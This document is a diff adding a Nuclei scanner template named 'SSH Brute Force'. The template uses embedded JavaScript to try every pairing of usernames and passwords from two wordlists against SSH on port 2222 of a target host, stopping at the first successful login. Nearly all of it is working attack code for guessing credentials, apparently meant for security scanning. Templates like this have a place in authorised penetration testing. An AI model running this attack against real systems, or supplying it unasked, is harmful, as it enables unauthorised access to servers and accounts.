@@ -1,0 +1,29 @@
+id: ssh-brute-force
+info:
+  name: SSH Brute Force
+  author: me
+  severity: high
+
+javascript:
+  - attack: clusterbomb
+    payloads:
+      user: "ssh_logins.txt"
+      pass: "ssh_passwords.txt"
+    
+    code: |
+      var ssh = require("nuclei/ssh");
+      var client = new ssh.SSHClient();
+      var connected = client.Connect(Host, 2222, User, Pass);
+      connected;
+
+    args:
+      Host: "{{Host}}"
+      User: "{{user}}"
+      Pass: "{{pass}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "response == true"
+          - "success == true"
